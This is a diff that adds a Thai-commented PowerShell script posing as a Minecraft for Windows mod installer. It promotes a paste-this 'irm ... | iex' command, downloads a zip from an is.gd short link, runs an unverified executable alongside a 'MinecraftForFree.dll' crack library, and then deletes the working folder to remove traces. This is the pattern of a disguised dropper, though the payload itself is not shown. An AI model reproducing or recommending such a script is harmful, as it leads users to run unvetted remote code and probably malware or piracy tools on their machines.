@@ -1,1 +1,60 @@
+# กำหนดพาธไฟล์ Minecraft และโฟลเดอร์ทำงาน
+$minecraftPath = "C:\XboxGames\Minecraft for Windows\Content\Minecraft.Windows.exe"
+$workingDir = "C:\phwyverysad"
+$zipUrl = "https://is.gd/EHPP8o"
+$zipFile = "$workingDir\minecraft_for_windows.zip"
 
+# ตรวจสอบว่ามี Minecraft for Windows ติดตั้งอยู่หรือไม่
+if (-not (Test-Path $minecraftPath)) {
+    # กรณีไม่พบไฟล์ Minecraft
+    Write-Host "ยังไม่มี Minecraft for Windows กรุณาดาวโหลดและติดตั้งให้เสร็จก่อนรัน irm `"is.gd\minecraft_for_windows`" | iex" -ForegroundColor Yellow
+    
+    # รอ 3 วินาที
+    Start-Sleep -Seconds 3
+    
+    # เปิดหน้า Microsoft Store สำหรับ Minecraft
+    Start-Process "ms-windows-store://pdp/?ProductId=9NBLGGH2JHXJ"
+} else {
+    # กรณีพบไฟล์ Minecraft ในเครื่อง
+    Write-Host "พบ Minecraft for Windows กำลังเริ่มขั้นตอนการจัดการไฟล์..." -ForegroundColor Green
+
+    # 1. สร้างโฟลเดอร์ C:\phwyverysad (ถ้ามีอยู่แล้วจะข้ามไป)
+    if (-not (Test-Path $workingDir)) {
+        New-Item -Path $workingDir -ItemType Directory | Out-Null
+    }
+
+    # 2. ดาวน์โหลดไฟล์ zip
+    Write-Host "กำลังดาวน์โหลดไฟล์..."
+    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
+
+    # 3. แตกไฟล์ zip ไปยังโฟลเดอร์ชั่วคราว
+    $extractPath = "$workingDir\temp_extract"
+    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
+
+    # 4. ย้ายไฟล์ที่กำหนดออกมาไว้ใน C:\phwyverysad
+    $filesToMove = @("KG UP - Mod Installer.exe", "MinecraftForFree.dll", "vcruntime140_1.dll")
+    
+    # ค้นหาและย้ายไฟล์ (ใช้ Get-ChildItem เพื่อความแม่นยำในกรณีโครงสร้างโฟลเดอร์ซ้อนกัน)
+    foreach ($fileName in $filesToMove) {
+        $foundFile = Get-ChildItem -Path $extractPath -Filter $fileName -Recurse
+        if ($foundFile) {
+            Move-Item -Path $foundFile.FullName -Destination $workingDir -Force
+        }
+    }
+
+    # 5. ลบไฟล์และโฟลเดอร์ที่ไม่จำเป็น
+    Remove-Item -Path $zipFile -Force
+    Remove-Item -Path $extractPath -Recurse -Force
+
+    # 6. สั่งรัน Mod Installer และรอจนกว่าจะปิดโปรแกรม
+    Write-Host "กำลังรัน Mod Installer..."
+    $process = Start-Process -FilePath "$workingDir\KG UP - Mod Installer.exe" -Wait -PassThru
+
+    # 7. เมื่อโปรแกรมปิดแล้ว ให้ลบโฟลเดอร์ทำงานทิ้ง
+    Write-Host "โปรแกรมปิดแล้ว กำลังล้างไฟล์ชั่วคราว..."
+    if (Test-Path $workingDir) {
+        Remove-Item -Path $workingDir -Recurse -Force
+    }
+    
+    Write-Host "เสร็จสิ้นขั้นตอนทั้งหมด" -ForegroundColor Green
+}
